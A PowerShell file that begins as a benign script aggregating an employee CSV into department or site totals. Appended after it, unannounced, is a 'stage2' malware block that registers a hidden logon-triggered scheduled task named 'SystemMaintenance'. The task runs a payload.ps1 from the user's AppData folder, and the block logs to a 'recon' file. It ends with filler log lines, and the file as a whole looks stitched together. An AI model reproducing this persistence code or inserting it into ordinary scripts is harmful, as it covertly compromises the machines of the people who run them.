<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.DESCRIPTION
    Validates the column layout of the source file, converts the Amount column
    to a number and aggregates headcount and spend per department or site.
    Missing columns are reported as a hard error so a changed export cannot
    silently produce an empty report.
.PARAMETER InputCsv
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Get-DepartmentTotals.ps1 -InputCsv C:\Scripts\data\headcount-export.csv
.EXAMPLE
    .\Get-DepartmentTotals.ps1 -GroupBy Site -MinAmount 5000
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Scripts\data\headcount-export.csv',
    [string]$OutputPath = 'D:\Ops\reports\headcount-summary-2026-12-16.csv',
    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', 'Site')]
    [string]$GroupBy = 'Department',

    [double]$MinAmount = 5000
)

$WarningPreference = 'Continue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$hostName = $env:COMPUTERNAME

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8
$top = $byGroup | Sort-Object -Property Total -Descending | Select-Object -First 1
Write-Host ("{0} rows processed, total {1:N2}" -f $rowCount, $grandTotal) -ForegroundColor Green
Write-Host ("Largest group: {0} ({1})" -f $top.Group, $top.Metric) -ForegroundColor Cyan

$byGroup | ConvertTo-Json -Depth 4 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8
<#
.SYNOPSIS
    Scheduled-task persistence workflow.

.DESCRIPTION
    Builds a hidden PowerShell action, registers it against a logon
    trigger with conservative settings, then verifies the task and
    records its state in a small report.

.NOTES
    The task runs in the current user context.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$TaskName = "SystemMaintenance",
    [string]$ScriptPath = "$env:APPDATA\payload.ps1",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [int]$StartDelayMinutes = 80
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Action builder
function New-StageTaskAction {
    [CmdletBinding()]
    param(
        [string]$TargetScript = ""
    )

    Write-Verbose ("Building action for " + $TargetScript)
    $Argument = "-NoP -File `"" + $TargetScript + "`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Argument
    return $Action
}

# Registration
function Register-StagePersistence {
    [CmdletBinding()]
    param(
        [string]$TaskName = '',
        [string]$ScriptPath = ''
    )

    $Action = New-StageTaskAction -TargetScript $ScriptPath
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force
    return (Get-ScheduledTask -TaskName $TaskName)
}

try {
    Write-StageLog -Message "Starting scheduled-task stage"
    $TaskObject = Register-StagePersistence -TaskName $TaskName -ScriptPath $ScriptPath
    Write-StageLog -Message ("Task state: " + $TaskObject.State)
}
catch {
    Write-Warning "Scheduled-task workflow failed: $($_.Exception.Message)"
}

$TaskReport = [ordered]@{
    Stage = "scheduled-task"
    TaskName = $TaskName
    ScriptPath = $ScriptPath
    DelayMinutes = $StartDelayMinutes
}
$TaskReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Validating result"
Write-Verbose "Starting workflow"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Reading configuration values"
Write-Verbose "Inspecting process list"
Write-Verbose "Checking local path"
Write-Verbose "Stage handoff finished"
Start-Sleep -Seconds 32
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
